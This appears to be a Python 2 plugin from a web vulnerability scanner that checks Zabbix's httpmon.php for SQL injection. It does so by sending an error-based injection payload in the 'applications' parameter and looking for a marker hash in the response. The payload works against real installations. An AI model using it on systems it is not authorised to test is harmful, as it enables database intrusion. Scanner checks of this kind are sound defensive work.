#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *

def run_domain(http,ob):
    list = []
    try:
        domain = ob['domain']
        detail = u''
        detail = detail.encode('utf8')
    
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        url += "zabbix/httpmon.php?applications=2%20and%20(select%201%20from%20(select%20count(*),concat(md5(333),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)"
        res, content = requestUrl(http,url,ob['task_id'],ob['domain_id'])
        if res['status'] == '200' and content.find('310dcbbf4cce62f762a2aaa148d556bd1')>=0:
            request = getRequest(url)
            response = getResponse(res)
            list.append(getRecord(ob,url,ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:ZabbixSqlInjectionScript.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])        
        write_scan_log(ob['task_id'],ob['domain_id'],"File:ZabbixSqlInjectionScript.py, run_domain function :" + str(e))        
    #end try
    
    return list
#end def